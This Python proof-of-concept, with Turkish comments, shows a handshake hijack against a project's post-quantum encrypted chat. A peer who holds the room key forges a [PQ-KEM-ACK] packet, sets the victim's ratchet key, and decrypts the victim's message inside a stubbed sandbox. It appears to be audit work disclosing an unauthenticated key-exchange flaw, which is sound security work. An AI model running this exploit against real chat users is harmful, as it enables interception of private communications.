#!/usr/bin/env python3
"""PoC 03: PQ-KEM el sikismasi kimlik dogrulamasiz -> saldirgan oturum anahtarini kendisi belirler.

Zafiyet: live_p2p_chat._on_mqtt_message() gelen ILK [PQ-KEM-ACK] paketini hicbir
kriptografik bag/ kimlik dogrulama olmadan kabul eder. Odayi (room_key) bilen kötü
niyetli bir akran, kurbanin gecici PQ acik anahtarina kendisi kapsülleyip ACK gonderirse
kurbanin ratchet anahtari saldirganin bildigi bir degere ayarlanir.
"""
import os
import sys
import types
import time
import shutil
import hashlib

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SANDBOX = "/tmp/opencode/aegis_poc/poc03"
shutil.rmtree(SANDBOX, ignore_errors=True)
os.makedirs(SANDBOX)
os.chdir(SANDBOX)
sys.path.insert(0, PROJECT_DIR)


def install_paho_stub():
    paho = types.ModuleType("paho")
    mqtt = types.ModuleType("paho.mqtt")
    client_mod = types.ModuleType("paho.mqtt.client")

    class CallbackAPIVersion:
        VERSION2 = 2

    class Client:
        def __init__(self, *a, **k):
            self.on_connect = None
            self.on_message = None
            self.on_disconnect = None
            self.published = []

        def connect(self, *a, **k):
            pass

        def loop_start(self):
            pass

        def subscribe(self, *a, **k):
            pass

        def publish(self, topic, payload, qos=0):
            self.published.append((topic, payload))
            return 0

        def loop_stop(self):
            pass

        def disconnect(self):
            pass

    client_mod.CallbackAPIVersion = CallbackAPIVersion
    client_mod.Client = Client
    mqtt.client = client_mod
    paho.mqtt = mqtt
    sys.modules["paho"] = paho
    sys.modules["paho.mqtt"] = mqtt
    sys.modules["paho.mqtt.client"] = client_mod
    return Client


Client = install_paho_stub()

import crypto_chat
from crypto_utils import PQHybridKEM
from live_p2p_chat import GlobalEncryptedChatSession

BASE_KEY = "Paylasilmis-Oda-Anahtari-2026!"
ROOM = "taktik-oda"
VICTIM_SECRET = "GIZLI: Yarın 21:00'de teslimat noktasına gelin."


def banner(title):
    print("\n" + "=" * 72)
    print(" " + title)
    print("=" * 72)


class FakeMsg:
    def __init__(self, payload: bytes):
        self.payload = payload


def decode_token(token, key):
    return crypto_chat.decrypt_message(token, key)["text"]


banner("PoC 03: PQ-KEM el sikismasi ele gecirme (handshake hijack)")

victim = GlobalEncryptedChatSession("victim", ROOM, BASE_KEY, lambda *a: None, lambda *a: None)
victim.client = Client()
victim.is_connected = True

print("[1] Kurban PQ el sikismasi baslatiyor...")
assert victim.initiate_pq_handshake(), "handshake publish edilemedi"
syn_topic, syn_token = victim.client.published[-1]

print("[*] Saldırgan oda anahtarini biliyor (odadaki kötü niyetli akran) -> SYN paketini cozer")
syn_text = decode_token(syn_token, BASE_KEY)
victim_pub_k = syn_text.split("[PQ-KEM-SYN]:", 1)[1].strip()
print(f"    Kurbanin gecici PQ acik anahtari ele gecirildi: {victim_pub_k[:48]}...")

print("[2] Saldırgan kurbanin acik anahtarina KENDISI kapsulleme yapiyor")
ct_armored, attacker_shared = PQHybridKEM.encapsulate(victim_pub_k)
attacker_room_key = hashlib.sha3_256(f"{BASE_KEY}|PQ:{attacker_shared}".encode("utf-8")).hexdigest()
print(f"    Saldirganin hesapladigi ratchet anahtari: {attacker_room_key[:32]}...")

print("[3] Saldırgan sahte [PQ-KEM-ACK] paketini odaya gonderiyor (base_room_key ile sifreli)")
ack_text = f"deadbeef01:eve: [PQ-KEM-ACK]:{ct_armored}"
ack_token = crypto_chat.encrypt_message(ack_text, BASE_KEY)
victim._on_mqtt_message(victim.client, None, FakeMsg(ack_token.encode("utf-8")))

print(f"    Kurbanin PQ durumu: pq_active={victim.pq_active}")
print(f"    Kurbanin yeni room_key'i: {victim.room_key[:32]}...")
assert victim.room_key == attacker_room_key, "ratchet ele gecirilemedi!"
print("    [!!] Kurban ve saldirgan AYNI ratchet anahtarini paylasiyor (esitlik dogrulandi)")

print("[4] Kurban 'PQ-korumali' kanaldan mesaj gonderiyor...")
victim.send_message(VICTIM_SECRET)
send_topic, send_token = victim.client.published[-1]

print("[5] Saldırgan mesaji KENDI turettigi anahtarla cozuyor...")
recovered = decode_token(send_token, attacker_room_key)
print(f"    Cozulen duz metin: '{recovered}'")
assert VICTIM_SECRET in recovered

print("\n" + "-" * 72)
print("KANIT: [PQ-KEM-ACK] kimlik/kapsul baglamasi dogrulanmadigi icin odadaki kotu niyetli")
print("       akran ratchet'i ele gecirdi; kurbanin 'post-quantum korumali' mesaji saldirgan")
print("       tarafindan okunabildi. README'deki 'quantum-resistant E2EE ratchet' iddiasi cignendi.")
print("-" * 72)
